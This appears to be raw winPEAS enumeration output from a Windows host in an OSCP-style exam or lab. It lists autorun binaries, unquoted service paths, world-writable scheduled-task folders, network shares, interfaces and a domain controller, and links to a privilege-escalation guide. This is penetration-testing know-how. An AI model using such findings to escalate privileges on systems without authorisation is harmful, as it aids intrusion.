    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\Installer
    FolderPerms: Administrators [Allow: AllAccess]
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\Installer\setup.exe --configure-user-settings --verbose-logging --system-level --msedge (Unquoted and Space detected) - C:\,C:\Program Files 
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    RegPerms: Administrators [Allow: FullControl]
    Key: StubPath
    Folder: C:\Windows\system32
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    RegPerms: Administrators [Allow: FullControl]
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO
    FolderPerms: Administrators [Allow: AllAccess]
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\,C:\Program Files 
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO
    FolderPerms: Administrators [Allow: AllAccess]
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\,C:\Program Files 
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Administrator [Allow: Delete], Administrators [Allow: AllAccess]
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\ProgramData\Microsoft\Windows,C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini 
    FilePerms: Administrators [Allow: AllAccess], Administrator [Allow: Delete]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Administrators [Allow: AllAccess], Administrator [Allow: AllAccess]
    File: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\Administrator\AppData\Roaming\Microsoft\Windows,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini 
    FilePerms: Administrators [Allow: AllAccess], Administrator [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Administrators [Allow: AllAccess]
    File: C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows
    FilePerms: Administrators [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles], Administrators [Allow: AllAccess]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles], Administrators [Allow: AllAccess]
   =================================================================================================


    Folder: C:\windows
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\windows\system.ini
    FilePerms: Administrators [Allow: AllAccess]
   =================================================================================================


    Folder: C:\windows
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\windows\win.ini
    FilePerms: Administrators [Allow: AllAccess]
   =================================================================================================


    Key: From WMIC
    Folder: C:\Windows\System32
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\Windows\System32\OneDriveSetup.exe /thfirstsetup (Unquoted and Space detected) - C:\Windows\System32\OneDriveSetup.exe 
   =================================================================================================


    Key: From WMIC
    Folder: C:\Windows\System32
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\Windows\System32\OneDriveSetup.exe /thfirstsetup (Unquoted and Space detected) - C:\Windows\System32\OneDriveSetup.exe 
   =================================================================================================


    Key: From WMIC
    Folder: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive
    FolderPerms: Administrators [Allow: AllAccess]
    File: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: Administrators [Allow: AllAccess]
   =================================================================================================


    Key: From WMIC
    Folder: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive
    FolderPerms: Administrators [Allow: AllAccess], Administrator [Allow: AllAccess]
    File: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: Administrators [Allow: AllAccess], Administrator [Allow: AllAccess]
   =================================================================================================


    Key: From WMIC
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application
    FolderPerms: Administrators [Allow: AllAccess]
    File: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start /prefetch:5
    FilePerms: Administrators [Allow: AllAccess]
   =================================================================================================


    Key: From WMIC
    Folder: C:\Program Files\VMware\VMware Tools
    FolderPerms: Administrators [Allow: AllAccess]
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
    FilePerms: Administrators [Allow: AllAccess]
   =================================================================================================


╔══════════╣ Scheduled Applications --Non Microsoft--
╚ Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html



════════════════════════════════════╣ Network Information ╠════════════════════════════════════

╔══════════╣ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

╔══════════╣ Enumerate Network Mapped Drives (WMI)
   Local Name         :       
   Remote Name        :       \\192.168.49.104\share
   Remote Path        :       \\192.168.49.104\share
   Status             :       OK
   Connection State   :       Connected
   Persistent         :       False
   UserName           :       username
   Description        :       RESOURCE CONNECTED - Microsoft Windows Network

   =================================================================================================


╔══════════╣ Host File

╔══════════╣ Network Ifaces and known hosts
╚ The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:8A:96:F7]: 192.168.104.206 / 255.255.255.0
        Gateways: 192.168.104.254
        Known hosts:
          192.168.104.111       00-50-56-8A-24-C6     Dynamic
          192.168.104.254       00-50-56-8A-C5-9B     Dynamic
          192.168.104.255       FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Ethernet1[00:50:56:8A:38:82]: 172.16.104.206 / 255.255.255.0
        DNSs: 172.16.104.200
        Known hosts:
          172.16.104.200        00-50-56-8A-16-6F     Dynamic
          172.16.104.202        00-50-56-8A-66-6F     Dynamic
          172.16.104.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          224.0.0.252           00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static



╔══════════╣ Firewall Rules
╚ Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: DOMAIN, PUBLIC
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:
  [X] Exception: Object reference not set to an instance of an object.

╔══════════╣ DNS cached --limit 70--
    Entry                                 Name                                  Data
    dc20.oscp.exam                        DC20.oscp.exam                        172.16.104.200
    dc20.oscp.exam                        DC20.oscp.exam                        172.16.104.200

```